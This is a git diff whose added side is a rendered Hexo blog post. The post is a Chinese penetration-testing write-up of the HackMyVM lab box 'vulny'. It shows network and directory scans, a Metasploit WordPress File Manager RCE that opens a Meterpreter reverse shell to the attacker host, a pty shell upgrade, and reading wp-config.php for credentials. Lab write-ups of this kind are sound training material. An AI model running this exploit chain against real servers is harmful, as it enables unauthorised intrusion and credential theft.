@@ -1,161 +1,525 @@
-const { Component } = require('inferno');
-const classname = require('hexo-component-inferno/lib/util/classname');
-const Head = require('./common/head');
-const Navbar = require('./common/navbar');
-const Widgets = require('./common/widgets');
-const Footer = require('./common/footer');
-const Scripts = require('./common/scripts');
-const Search = require('./common/search');
 
-module.exports = class extends Component {
-    render() {
-        const { site, config, page, helper, body } = this.props;
-        const { comment, use_pjax, has_banner } = config;
-        const { __, my_cdn, url_for } = helper;
+    <!DOCTYPE html>
+    <html lang="en"
+            
+          
+    >
+    <head>
+    <meta charset="utf-8">
+    
 
-        // 默认不加载公式，文中头部开启mathJax:true才加载
-        var isMath = page.mathJax != undefined && page.mathJax;
-        const language = page.lang || page.language || config.language;
-        const columnCount = Widgets.getColumnCount(config.widgets);
-        const hasComment = comment != undefined && comment.type != undefined && (comment.type == 'gitalk' || comment.type == 'valine')
-            && (comment.has_hot_recommend || comment.has_latest_comment);
-        var appKey;
-        var appId;
-        var userName;
-        var userRepo;
-        var isValine;
+    
 
-        if (comment != undefined && comment.type != undefined && comment.type == 'gitalk') {
-            appId = comment.client_id;
-            appKey = comment.client_secret;
-            userName = comment.owner;;
-            userRepo = comment.repo;
-            isValine = false;
-        } else if (comment != undefined && comment.type != undefined && comment.type == 'valine') {
-            appId = comment.app_id;
-            appKey = comment.app_key;
-            userName = comment.owner;
-            isValine = true;
-        }
-        var hotTitle = __('widget.hot_recommend');
-        var hotTip = __('widget.hot_recommend_tip');
-
-        // =====index hot_recommend
-        var hotRecommendStr =
-            `<div class="card widget">
-            <div class="card-content">
-                <h3 class="menu-label">${hotTitle}</h3><span id="index_hot_div">${hotTip}</span>
-            </div>
-        </div>`;
-
-        // =====index banner
-        var bannerStr =
-            `<div class="card widget">
-            <div class="card-content1 card-image">
-                <span id="banner"><div class="card-content ">Banner ${hotTip}</div></span>
-            </div>
-        </div>`;
+    
+    <title>
+        vulny |
         
-        // mathjax support 使用方法 md文章头部开启mathJax: true，md文章中公式格式：$$f(x) = a_1x^n + a_2x^{n-1} + a_3x^{n-2}$$
-        var mathJaxJs = `function loadMathJax() { //加载mathjax
-            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
-                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
-                var math = document.getElementsByClassName("entry-content")[0];
-                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
-            });
-        };loadMathJax();`;
+        hackboy</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CUbuntu%20Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+    
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/v4-font-face.min.css">
 
-        var pjaxJs = `var pjax = new Pjax({
-            elements: "a",//代表点击链接就更新
-            selectors: [  //代表要更新的节点
-                ".section",
-                "title"
-            ],
-            cache: true,
-            cacheBust:false
-        })
+    
+<link rel="stylesheet" href="/css/loader.css">
 
-        function loadBusuanzi(){
-        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
-        }
-
-        function loadMathJax() { //加载mathjax
-            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
-                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
-                var math = document.getElementsByClassName("entry-content")[0];
-                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
-            });
-        };
-
-        // 开始 PJAX 执行的函数
-        document.addEventListener('pjax:send', function () {
-        });
+    <meta name="description" content="1.扫描网段：123456789101112131415┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24       Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-26 09:22 CSTNmap scan report for 192.168.56.1Host is up (0.0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulny">
+<meta property="og:url" content="http://example.com/2023/07/26/vulny/index.html">
+<meta property="og:site_name" content="hackboy">
+<meta property="og:description" content="1.扫描网段：123456789101112131415┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24       Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-26 09:22 CSTNmap scan report for 192.168.56.1Host is up (0.0">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pic/image-20230726093906134.png">
+<meta property="og:image" content="http://example.com/pic/image-20230726094904127.png">
+<meta property="og:image" content="http://example.com/pic/image-20230726095423137.png">
+<meta property="article:published_time" content="2023-07-26T00:58:38.000Z">
+<meta property="article:modified_time" content="2023-07-29T04:22:32.091Z">
+<meta property="article:author" content="honkerZ">
+<meta property="article:tag" content="目录遍历">
+<meta property="article:tag" content="hackmyvm">
+<meta property="article:tag" content="msf">
+<meta property="article:tag" content="fuzz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pic/image-20230726093906134.png">
+    
+        <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
         
-        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
-        document.addEventListener('pjax:complete', function () {
-            $(".section").css({opacity:1});
-            if(${hasComment}){
-                $.getScript('${my_cdn(url_for('/js/comment-issue-data.js'))}',function(){loadIssueData('${appId}','${appKey}','${userName}','${userRepo}',${isValine});});
-            }
-            if(${isMath}){
-                loadMathJax();
-            }
-            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
-            loadBackTop();
-            loadBusuanzi();
-            if(typeof loadBanner == 'function'){
-                loadBanner();
-            }
-        });`;
+<link rel="stylesheet" href="https://unpkg.com/typeface-source-code-pro@1.1.13/index.css">
 
-        if (comment == undefined || comment.type == undefined
-            || comment.type != 'gitalk'
-            || comment.has_hot_recommend == undefined
-            || !comment.has_hot_recommend) {
-            hotRecommendStr = '';
-        }
+    
+    
+<link rel="stylesheet" href="/css/style.css">
 
-        var indexTopData = hotRecommendStr;
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
 
-        const hasBanner = has_banner != undefined && has_banner;
+    
+    
+    
+    
+    
+<script src="https://unpkg.com/pace-js@1.2.4/pace.min.js"></script>
 
-        if (indexTopData == '' && hasBanner) {
-            indexTopData = bannerStr;
-        }
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/wowjs@1.1.3/css/libs/animate.css">
 
-        if (page.path != 'index.html') {
-            indexTopData = '';
-        }
+        
+<script src="https://unpkg.com/wowjs@1.1.3/dist/wow.min.js"></script>
 
-        let isPageOrPost = page.layout == 'page' || page.layout == 'post';
-        return <html lang={language ? language.substr(0, 2) : ''}>
-            <Head site={site} config={config} helper={helper} page={page} />
-            <body className={`is-${columnCount}-column has-navbar-fixed-top`}>
-                <Navbar config={config} helper={helper} page={page} />
-                <script type="text/javascript" src={my_cdn(url_for('/js/theme-setting.js'))}></script>
-                <section class="section">
-                    <div class="container">
-                        <div class="columns">
-                            <div class={classname({
-                                column: true,
-                                'order-2': true,
-                                'column-main': true,
-                                'is-12': columnCount === 1,
-                                'is-8-tablet is-8-desktop is-6-widescreen': (page.layout != 'post' && page.layout != 'page') && columnCount === 3,
-                                'is-8-tablet is-8-desktop is-9-widescreen': columnCount === 2 || page.layout === 'post'
-                            })} dangerouslySetInnerHTML={{__html: indexTopData + body}}></div>
-                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'}/>
-                            {isPageOrPost ? null : <Widgets site={site} config={config} helper={helper} page={page} position={'right'}/>}
-                        </div>
-                    </div>
-                </section>
-                <Footer config={config} helper={helper} />
-                <Scripts site={site} config={config} helper={helper} page={page} />
-                <Search config={config} helper={helper} />
-                {use_pjax ? <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> : null}
-                {use_pjax ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: pjaxJs }}></script> : null}
-                {isMath ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: mathJaxJs }}></script> : null}
-            </body>
-        </html>;
-    }
-};
+        <script>
+          new WOW({
+            offset: 0,
+            mobile: true,
+            live: false
+          }).init();
+        </script>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+    
+<div id='loader'>
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="loading-taichi">
+      <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+      <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+      <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+      <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+    </svg>
+    </div>
+    <div class="loading-word">黑客学习...</div>
+  </div>
+</div>
+</div>
+
+<script>
+  const endLoading = function() {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('load', endLoading);
+  document.getElementById('loader').addEventListener('click', endLoading);
+</script>
+
+
+    <div id="container">
+        <div id="wrap">
+            <header id="header">
+    
+        <img data-src="http://lc-PwMydsXe.cn-n1.lcfile.com/ioOPYpy2N6fKFTkyKTwjrkXcjsl1DFRO/77ff0b411a424572a23fa0be294d5334.jpg" data-sizes="auto" alt="vulny" class="lazyload">
+    
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <div id="logo-wrap">
+                
+                    
+                    
+                        <a href="/" id="logo"><h1>vulny</h1></a>
+                    
+                
+            </div>
+            
+                
+                
+            
+        </div>
+        <div id="header-inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/">Home</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/archives">Archives</a>
+                    </span>
+                
+            </nav>
+            <nav id="sub-nav">
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml"
+                       title="RSS Feed"></a>
+                
+                
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+            </div>
+        </div>
+    </div>
+</header>
+
+            <div id="content" class="outer">
+                <section id="main"><article id="post-vulny" class="h-entry article article-type-post"
+         itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <div class="article-inner">
+        <div class="article-meta">
+            <div class="article-date wow slideInLeft">
+    <a href="/2023/07/26/vulny/" class="article-date-link">
+        <time datetime="2023-07-26T00:58:38.000Z"
+              itemprop="datePublished">2023-07-26</time>
+    </a>
+</div>
+
+            
+    <div class="article-category wow slideInLeft">
+        <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
+    </div>
+
+
+        </div>
+        <div class="hr-line"></div>
+        
+
+        <div class="e-content article-entry" itemprop="articleBody">
+            
+                <h2 id="1-扫描网段："><a href="#1-扫描网段：" class="headerlink" title="1.扫描网段："></a>1.扫描网段：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24       </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-26</span> <span class="number">09</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.0011</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:ED:<span class="number">07</span>:<span class="number">63</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">15</span>:<span class="number">51</span>:D4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.46</span> seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-扫描端口服务："><a href="#2-扫描端口服务：" class="headerlink" title="2.扫描端口服务："></a>2.扫描端口服务：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">Host is up (<span class="number">0.0022</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp    open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-title</span>: Apache2 Ubuntu Default Page: It works</span><br><span class="line">| http<span class="literal">-methods</span>: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">41</span> (Ubuntu)</span><br><span class="line"><span class="number">33060</span>/tcp open  mysqlx?</span><br><span class="line">| fingerprint<span class="literal">-strings</span>: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message<span class="string">&quot;</span></span><br><span class="line"><span class="string">|_    HY000</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-查看一下网页："><a href="#3-查看一下网页：" class="headerlink" title="3.查看一下网页："></a>3.查看一下网页：</h2><p><img src="/../pic/image-20230726093906134.png" alt="image-20230726093906134"></p>
+<p>又是初始界面，扫目录</p>
+<h2 id="4-扫目录："><a href="#4-扫目录：" class="headerlink" title="4.扫目录："></a>4.扫目录：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.132          </span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">43</span>:<span class="number">09</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/javascript           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">321</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">javascript</span>/]</span><br><span class="line">/secret               (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">317</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/]</span><br><span class="line">/server<span class="literal">-status</span>        (Status: <span class="number">403</span>) [<span class="type">Size</span>: <span class="number">279</span>]</span><br><span class="line">Progress: <span class="number">220225</span> / <span class="number">220561</span> (<span class="number">99.85</span>%)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">45</span>:<span class="number">39</span> Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>看一下：</p>
+<p><img src="/../pic/image-20230726094904127.png" alt="image-20230726094904127"></p>
+<h2 id="5-扫二阶目录"><a href="#5-扫二阶目录" class="headerlink" title="5.扫二阶目录"></a>5.扫二阶目录</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.132/secret</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.132</span>/secret</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">49</span>:<span class="number">26</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp<span class="literal">-content</span>           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">328</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/<span class="type">wp</span>-<span class="type">content</span>/]</span><br><span class="line">/wp<span class="literal">-includes</span>          (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">329</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/<span class="type">wp</span>-<span class="type">includes</span>/]</span><br><span class="line">/wp<span class="literal">-admin</span>             (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">326</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.132</span>/<span class="type">secret</span>/<span class="type">wp</span>-<span class="type">admin</span>/]</span><br><span class="line">Progress: <span class="number">220217</span> / <span class="number">220561</span> (<span class="number">99.84</span>%)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">26</span> <span class="number">09</span>:<span class="number">52</span>:<span class="number">01</span> Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-查看一下："><a href="#6-查看一下：" class="headerlink" title="6.查看一下："></a>6.查看一下：</h2><p><img src="/../pic/image-20230726095423137.png" alt="image-20230726095423137"></p>
+<h2 id="7-msf上有相关漏洞，试试："><a href="#7-msf上有相关漏洞，试试：" class="headerlink" title="7.msf上有相关漏洞，试试："></a>7.msf上有相关漏洞，试试：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> targeturi /secret</span><br><span class="line">targeturi =&gt; /secret</span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. <span class="string">&quot;set ForceExploit true&quot;</span> to override check result.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; <span class="built_in">set</span> ForceExploit true</span><br><span class="line">ForceExploit =&gt; true</span><br><span class="line">msf6 exploit(multi/http/wp_file_manager_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> </span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to disable)</span><br><span class="line">[!] Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">56.132</span>:<span class="number">80</span> - Payload is at /secret/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files/<span class="number">4</span>obwHD.php</span><br><span class="line">[*] Sending stage (<span class="number">39927</span> bytes) to <span class="number">192.168</span>.<span class="number">56.132</span></span><br><span class="line">[+] Deleted <span class="number">4</span>obwHD.php</span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span>.<span class="number">56.132</span>:<span class="number">56156</span>) at <span class="number">2023</span><span class="literal">-07-26</span> <span class="number">10</span>:<span class="number">00</span>:<span class="number">50</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">&lt;ress/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files<span class="variable">$</span> export TERM=xterm</span><br><span class="line">export TERM=xterm</span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress/wp<span class="literal">-content</span>/plugins/wp<span class="operator">-file</span><span class="literal">-manager</span>/lib/files<span class="variable">$</span> <span class="built_in">cd</span> /usr/share/wordpress</span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">index.php           wp<span class="literal">-comments-post</span>.php  wp<span class="literal">-includes</span>        wp<span class="literal">-settings</span>.php</span><br><span class="line">readme.html         wp<span class="literal">-config-sample</span>.php  wp<span class="literal">-links-opml</span>.php  wp<span class="literal">-signup</span>.php</span><br><span class="line">wp<span class="literal">-activate</span>.php     wp<span class="literal">-config</span>.php         wp<span class="literal">-load</span>.php        wp<span class="literal">-trackback</span>.php</span><br><span class="line">wp<span class="literal">-admin</span>            wp<span class="literal">-content</span>            wp<span class="literal">-login</span>.php       xmlrpc.php</span><br><span class="line">wp<span class="literal">-blog-header</span>.php  wp<span class="literal">-cron</span>.php           wp<span class="literal">-mail</span>.php</span><br><span class="line">www<span class="literal">-data</span>@vulny:/usr/share/wordpress<span class="variable">$</span> <span class="built_in">cat</span> wp<span class="literal">-config</span>.php</span><br><span class="line"><span class="built_in">cat</span> wp<span class="literal">-config</span>.php</span><br><span class="line">&lt;?php</span><br><span class="line">/***</span><br><span class="line"> * WordPress<span class="string">&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="string"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="string"> * 